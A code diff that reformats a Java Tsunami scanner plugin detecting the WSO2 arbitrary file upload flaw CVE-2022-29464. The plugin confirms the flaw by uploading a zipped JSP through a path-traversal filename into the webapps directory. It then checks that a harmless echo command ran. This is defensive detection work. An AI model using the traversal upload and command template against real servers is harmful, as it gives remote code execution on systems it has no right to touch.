@@ -40,7 +40,14 @@ import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
-import com.google.tsunami.proto.*;
+import com.google.tsunami.proto.DetectionReport;
+import com.google.tsunami.proto.DetectionReportList;
+import com.google.tsunami.proto.DetectionStatus;
+import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.Severity;
+import com.google.tsunami.proto.TargetInfo;
+import com.google.tsunami.proto.Vulnerability;
+import com.google.tsunami.proto.VulnerabilityId;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.time.Clock;
@@ -56,158 +63,159 @@ import okio.Buffer;
 
 /** A {@link VulnDetector} that detects the CVE-2022-29464 vulnerability. */
 @PluginInfo(
-        type = PluginType.VULN_DETECTION,
-        name = "Cve202229464VulnDetector",
-        version = "0.1",
-        description = "This detector checks wide range of WSO2 products RCE (CVE-2022-29464)",
-        author = "yuradoc (yuradoc.research@gmail.com)",
-        bootstrapModule = Cve202229464VulnDetectorBootstrapModule.class)
+    type = PluginType.VULN_DETECTION,
+    name = "Cve202229464VulnDetector",
+    version = "0.1",
+    description = "This detector checks wide range of WSO2 products RCE (CVE-2022-29464)",
+    author = "yuradoc (yuradoc.research@gmail.com)",
+    bootstrapModule = Cve202229464VulnDetectorBootstrapModule.class)
 public final class Cve202229464VulnDetector implements VulnDetector {
-    @VisibleForTesting
-    static final String TEST_STR_RCE = Long.toHexString(Double.doubleToLongBits(Math.random()));
+  @VisibleForTesting
+  static final String TEST_STR_RCE = Long.toHexString(Double.doubleToLongBits(Math.random()));
 
-    private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-    private static final String FILE_UPLOAD_PATH = "fileupload/toolsAny";
-    private static final String FILE_NAME =
-            "authenticationendpoint-test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
-    private static final String FILE_NAME_EXT = ".war";
-    private static final String FILE_REMOTE_LOCATION =
-            "../../../../repository/deployment/server/webapps/" + FILE_NAME;
-    private static final String FUNC_OS_RCE = "echo " + TEST_STR_RCE;
-    private static final String FUNC_OS_RCE_PLACEHOLDER = "{{CMD}}";
-    private static final int UNPACK_TIMEOUT = 18;
-    private final HttpClient httpClient;
-    private final Clock utcClock;
-    private final String requestBodyTemplate;
+  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
+  private static final String FILE_UPLOAD_PATH = "fileupload/toolsAny";
+  private static final String FILE_NAME =
+      "authenticationendpoint-test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
+  private static final String FILE_NAME_EXT = ".war";
+  private static final String FILE_REMOTE_LOCATION =
+      "../../../../repository/deployment/server/webapps/" + FILE_NAME;
+  private static final String FUNC_OS_RCE = "echo " + TEST_STR_RCE;
+  private static final String FUNC_OS_RCE_PLACEHOLDER = "{{CMD}}";
+  private static final int UNPACK_TIMEOUT = 18;
+  private final HttpClient httpClient;
+  private final Clock utcClock;
+  private final String requestBodyTemplate;
 
-    @Inject
-    Cve202229464VulnDetector(HttpClient httpClient, @UtcClock Clock utcClock) throws IOException {
-        this.httpClient = checkNotNull(httpClient);
-        this.utcClock = checkNotNull(utcClock);
-        requestBodyTemplate =
-                Resources.toString(Resources.getResource(this.getClass(), "requestBody.jsp"), UTF_8);
-    }
+  @Inject
+  Cve202229464VulnDetector(HttpClient httpClient, @UtcClock Clock utcClock) throws IOException {
+    this.httpClient = checkNotNull(httpClient);
+    this.utcClock = checkNotNull(utcClock);
+    requestBodyTemplate =
+        Resources.toString(Resources.getResource(this.getClass(), "requestBody.jsp"), UTF_8);
+  }
 
-    private static boolean isTungstenHttpsService(NetworkService networkService) {
-        return NetworkServiceUtils.getServiceName(networkService).equals("ssl/tungsten-https")
-                || NetworkServiceUtils.getServiceName(networkService).equals("ssl/wso2esb-console");
-    }
+  private static boolean isTungstenHttpsService(NetworkService networkService) {
+    return NetworkServiceUtils.getServiceName(networkService).equals("ssl/tungsten-https")
+        || NetworkServiceUtils.getServiceName(networkService).equals("ssl/wso2esb-console");
+  }
 
-    public static byte[] makeZip(String fileName, String content) throws IOException {
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ZipOutputStream zos = new ZipOutputStream(baos);
-        ZipEntry zipEntry = new ZipEntry(fileName);
-        zos.putNextEntry(zipEntry);
-        zos.write(content.getBytes());
-        zos.closeEntry();
-        zos.close();
-        return baos.toByteArray();
-    }
+  public static byte[] makeZip(String fileName, String content) throws IOException {
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    ZipOutputStream zos = new ZipOutputStream(baos);
+    ZipEntry zipEntry = new ZipEntry(fileName);
+    zos.putNextEntry(zipEntry);
+    zos.write(content.getBytes());
+    zos.closeEntry();
+    zos.close();
+    return baos.toByteArray();
+  }
 
-    @Override
-    public DetectionReportList detect(
-            TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
-        logger.atInfo().log("Cve202229464VulnDetector starts detecting.");
+  @Override
+  public DetectionReportList detect(
+      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
+    logger.atInfo().log("Cve202229464VulnDetector starts detecting.");
 
-        return DetectionReportList.newBuilder()
-                .addAllDetectionReports(
-                        matchedServices.stream()
-                                .filter(Cve202229464VulnDetector::isTungstenHttpsService)
-                                .filter(this::isServiceVulnerable)
-                                .map(networkService -> buildDetectionReport(targetInfo, networkService))
-                                .collect(toImmutableList()))
-                .build();
-    }
+    return DetectionReportList.newBuilder()
+        .addAllDetectionReports(
+            matchedServices.stream()
+                .filter(Cve202229464VulnDetector::isTungstenHttpsService)
+                .filter(this::isServiceVulnerable)
+                .map(networkService -> buildDetectionReport(targetInfo, networkService))
+                .collect(toImmutableList()))
+        .build();
+  }
 
-    @VisibleForTesting
-    String buildRootUri(NetworkService networkService) {
-        return String.format("https://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
-    }
+  @VisibleForTesting
+  String buildRootUri(NetworkService networkService) {
+    return String.format("https://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
+  }
 
-    private boolean isServiceVulnerable(NetworkService networkService) {
-        final String rootUri = buildRootUri(networkService);
-        final String targetUploadUri = rootUri + FILE_UPLOAD_PATH;
+  private boolean isServiceVulnerable(NetworkService networkService) {
+    final String rootUri = buildRootUri(networkService);
+    final String targetUploadUri = rootUri + FILE_UPLOAD_PATH;
 
-        String requestBody = requestBodyTemplate.replace(FUNC_OS_RCE_PLACEHOLDER, FUNC_OS_RCE);
+    String requestBody = requestBodyTemplate.replace(FUNC_OS_RCE_PLACEHOLDER, FUNC_OS_RCE);
 
-        try {
-            MultipartBody mBody =
-                    new MultipartBody.Builder()
-                            .setType(MultipartBody.FORM)
-                            .addFormDataPart(
-                                    FILE_REMOTE_LOCATION + FILE_NAME_EXT,
-                                    FILE_REMOTE_LOCATION + FILE_NAME_EXT,
-                                    RequestBody.create(
-                                            MediaType.parse("application/zip"), makeZip("index.jsp", requestBody)))
-                            .build();
+    try {
+      MultipartBody mBody =
+          new MultipartBody.Builder()
+              .setType(MultipartBody.FORM)
+              .addFormDataPart(
+                  FILE_REMOTE_LOCATION + FILE_NAME_EXT,
+                  FILE_REMOTE_LOCATION + FILE_NAME_EXT,
+                  RequestBody.create(
+                      MediaType.parse("application/zip"), makeZip("index.jsp", requestBody)))
+              .build();
 
-            Buffer sink = new Buffer();
-            mBody.writeTo(sink);
+      Buffer sink = new Buffer();
+      mBody.writeTo(sink);
 
-            HttpResponse response =
-                    httpClient.send(
-                            post(targetUploadUri)
-                                    .setHeaders(
-                                            HttpHeaders.builder()
-                                                    .addHeader(CONTENT_TYPE, mBody.contentType().toString())
-                                                    .addHeader(CONNECTION, "close")
-                                                    .build())
-                                    .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
-                                    .build(),
-                            networkService);
+      HttpResponse response =
+          httpClient.send(
+              post(targetUploadUri)
+                  .setHeaders(
+                      HttpHeaders.builder()
+                          .addHeader(CONTENT_TYPE, mBody.contentType().toString())
+                          .addHeader(CONNECTION, "close")
+                          .build())
+                  .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
+                  .build(),
+              networkService);
 
-            String body = response.bodyString().get();
-            if (!(response.status().code() == HttpStatus.OK.code()
-                    && body.length() > 0
-                    && Double.parseDouble(body) > 0)) {
-                return false;
-            }
-
-            Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(UNPACK_TIMEOUT));
-
-            response =
-                    httpClient.send(
-                            get(rootUri + FILE_NAME).setHeaders(HttpHeaders.builder().build()).build(),
-                            networkService);
-
-            if (response.status().code() == HttpStatus.OK.code()
-                    && response.bodyString().isPresent()
-                    && response.bodyString().get().contains(TEST_STR_RCE)) {
-                return true;
-            }
-        } catch (Exception e) {
-            logger.atWarning().log("Failed to send request.");
-            return false;
-        }
+      String body = response.bodyString().get();
+      if (!(response.status().code() == HttpStatus.OK.code()
+          && body.length() > 0
+          && Double.parseDouble(body) > 0)) {
         return false;
-    }
+      }
 
-    private DetectionReport buildDetectionReport(
-            TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
-        return DetectionReport.newBuilder()
-                .setTargetInfo(targetInfo)
-                .setNetworkService(vulnerableNetworkService)
-                .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
-                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
-                .setVulnerability(
-                        Vulnerability.newBuilder()
-                                .setMainId(
-                                        VulnerabilityId.newBuilder()
-                                                .setPublisher("TSUNAMI_COMMUNITY")
-                                                .setValue("CVE-2022-29464"))
-                                .setSeverity(Severity.CRITICAL)
-                                .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
-                                .setDescription(
-                                        "WSO2 API Manager 2.2.0, up to 4.0.0,WSO2 Identity Server 5.2.0, up to"
-                                                + " 5.11.0,WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0,WSO2"
-                                                + " Identity Server as Key Manager 5.3.0, up to 5.11.0,WSO2 Enterprise"
-                                                + " Integrator 6.2.0, up to 6.6.0,WSO2 Open Banking AM 1.4.0, up to"
-                                                + " 2.0.0,WSO2 Open Banking KM 1.4.0, up to 2.0.0 contains a arbitrary file"
-                                                + " upload vulnerability. Due to improper validation of user input, a"
-                                                + " malicious actor could upload an arbitrary file to a user controlled"
-                                                + " location of the server. By leveraging the arbitrary file upload"
-                                                + " vulnerability, it is further possible to gain remote code execution on"
-                                                + " the server."))
-                .build();
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(UNPACK_TIMEOUT));
+
+      response =
+          httpClient.send(
+              get(rootUri + FILE_NAME).setHeaders(HttpHeaders.builder().build()).build(),
+              networkService);
+
+      if (response.status().code() == HttpStatus.OK.code()
+          && response.bodyString().isPresent()
+          && response.bodyString().get().contains(TEST_STR_RCE)) {
+        return true;
+      }
+    } catch (Exception e) {
+      logger.atWarning().log("Failed to send request.");
+      return false;
     }
+    return false;
+  }
+
+  private DetectionReport buildDetectionReport(
+      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
+    return DetectionReport.newBuilder()
+        .setTargetInfo(targetInfo)
+        .setNetworkService(vulnerableNetworkService)
+        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
+        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
+        .setVulnerability(
+            Vulnerability.newBuilder()
+                .setMainId(
+                    VulnerabilityId.newBuilder()
+                        .setPublisher("TSUNAMI_COMMUNITY")
+                        .setValue("CVE-2022-29464"))
+                .setSeverity(Severity.CRITICAL)
+                .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
+                .setDescription(
+                    "WSO2 API Manager 2.2.0, up to 4.0.0,WSO2 Identity Server 5.2.0, up"
+                        + " to 5.11.0,WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0,"
+                        + " 5.6.0,WSO2 Identity Server as Key Manager 5.3.0, up to"
+                        + " 5.11.0,WSO2 Enterprise Integrator 6.2.0, up to 6.6.0,WSO2 Open"
+                        + " Banking AM 1.4.0, up to 2.0.0,WSO2 Open Banking KM 1.4.0, up"
+                        + " to 2.0.0 contains a arbitrary file upload vulnerability. Due"
+                        + " to improper validation of user input, a malicious actor could"
+                        + " upload an arbitrary file to a user controlled location of the"
+                        + " server. By leveraging the arbitrary file upload vulnerability,"
+                        + " it is further possible to gain remote code execution on the"
+                        + " server."))
+        .build();
+  }
 }
